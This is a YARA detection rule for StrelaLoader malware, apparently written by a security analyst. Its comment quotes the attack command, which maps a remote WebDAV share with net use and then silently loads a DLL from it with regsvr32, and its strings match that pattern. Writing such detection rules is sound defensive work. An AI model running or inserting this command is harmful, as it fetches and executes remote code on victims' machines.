rule StrelaLoader
{
    // cmd.exe /c net use \\<IP_ADDRESS>\davwwwroot\ && regsvr32 /s \\<IP_ADDRESS>\davwwwroot\<RANDOM_DLL_NAME>.dll
    
    meta:
        description = "CMD execution after StrelaLoader execution with net use and regsvr32 involving network activity"
        author = "Sherwyn"
        last_modified = "Nov-29-2024"
        
    strings:
        $cmd = "cmd.exe /c"
        $net = "net use"
        $regsvr32 = "regsvr32 /s"
        $ip = "\\\\[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}"
        $davwwwroot = "\\\\davwwwroot"
        $dll_pattern = "\\\\davwwwroot\\\\[A-Za-z0-9]{1,255}\\.dll"

    condition:
        $cmd and $net and $regsvr32 and $ip and $davwwwroot and $dll_pattern
}
